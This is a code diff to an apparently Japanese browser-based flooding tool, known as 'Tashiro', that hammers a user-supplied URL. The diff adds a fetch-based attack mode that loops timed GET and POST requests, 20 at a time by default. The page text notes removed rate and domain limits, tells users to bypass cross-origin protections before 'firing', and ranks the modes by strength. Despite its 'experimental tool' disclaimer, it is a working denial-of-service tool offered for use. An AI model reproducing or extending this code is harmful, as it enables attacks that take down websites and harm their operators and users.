@@ -118,10 +118,39 @@
 		m_toDoing_XML = setTimeout("goBomb_XML()", m_inInterval);
 	}
 
+	function main_fetch()
+	{
+		m_inInterval = document.m_form1.m_tbInterval.value;
+		m_inWinNum = document.m_form1.m_tbWinNum.value;
+		m_stBomburl = document.m_form1.m_tbUrl.value;
+		m_inCount = 0;
+		m_toDoing_fetch = setTimeout("goBomb_fetch()", m_inInterval);
+	}
+
+	function goBomb_fetch()
+	{
+		var bomb;
+		for(i = 0; i < m_inWinNum; i++)
+		{
+			bomb = m_stBomburl
+			//fetch GET
+			var req = new Request(bomb, { headers: {"User-Agent": "application/json;charset=utf-8" } })
+			fetch(req)
+			//fech POST
+			var req2 = new Request(bomb, { method: "POST", mode: "same-origin", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify(postdata)})
+			fetch(req2)
+		}
+		bombCounter();
+		m_toDoing_fetch = setTimeout("goBomb_fetch()", m_inInterval);
+	}
+
+
+
 	function stopBomb()
 	{
 		clearTimeout(m_toDoing);
 		clearTimeout(m_toDoing_XML);
+		clearTimeout(m_toDoing_fetch);
 		document.all.m_taInfo.value += "\n\n";
 		document.all.m_taInfo.value += "～訪問を中止しました～";
 	}
@@ -186,7 +215,7 @@
 本品は実験用のツールです。これを悪用して起こったいかなる損害にも、当方は責任を負いかねます。<br>
 <b>[追記 2022/12/05]</b> <br>更新間隔制限解除&ドメイン制限解除&XMLHttpRequest_GET/POST追加&キャッシュ無効化<br>
 <b>[留意点]</b><br><mark>WindowsではEdge、他はchromeが一番高効率です</mark><br>更新間隔などの数値は既定値が最良です。うまく行かない場合は変えてください。</br>
-<b><u><font color="red">[撃つ前に]</font></u></b> <br><mark>XMLHttpRequestを使用しているため使用中のブラウザでクロスドメイン制約を回避する必要があります。<br>Windowsの方はページ最下部の説明に従ってください。<strong>Android/ios</strong>でchromeを使用している場合はそのまま撃てます。</mark></br>
+<b><u><font color="red">[撃つ前に]</font></u></b> <br><mark>XMLHttpRequest/fetch APIを使用しているため使用中のブラウザでクロスドメイン制約を回避する必要があります。<br>Windowsの方はページ最下部の説明に従ってください。<strong>Android/ios</strong>でchromeを使用している場合はそのまま撃てます。</mark></br>
 
 <b>[その他の田代]</b>
 <br>
@@ -211,9 +240,9 @@
 【同時更新数】（窓数）<br>
 <input class="css-button-rounded--black" type="text" size="10" name="m_tbWinNum" value="20"><br>
 <br>
-<strong><mark>開始1は従来の田代。開始2はXMLHttpRequestを用いた田代。<br>多重起動可能ですがブラウザがクラッシュすることがあります。<mark></strong>
+<strong><mark>開始1は従来の田代。開始2はXMLHttpRequestを用いた田代。開始3はfetchを用いた田代。<br>多重起動可能ですがブラウザがクラッシュすることがあります。<br>強さは開始1＜開始2＜開始3<mark></strong>
 <br><br>
-<input class="css-button-rounded--black" type="button" value="開始1" onclick="main();"><input class="css-button-rounded--black" type="button" value="開始2(XML)" onclick="main_XML();"><input class="css-button-rounded--black" type="button" value="中止" onclick="stopBomb();"> <br>
+<input class="css-button-rounded--black" type="button" value="開始1" onclick="main();"><input class="css-button-rounded--black" type="button" value="開始2(XML)" onclick="main_XML();"><input class="css-button-rounded--black" type="button" value="開始3(fetch)" onclick="main_fetch();"><input class="css-button-rounded--black" type="button" value="中止" onclick="stopBomb();"> <br>
 <br>
 【情報】<br>
 <textarea class="css-button-rounded--black" id="m_taInfo" style="border:1px solid #000000;height:100px;width:70%;">※ここに情報が表示されます。</textarea>
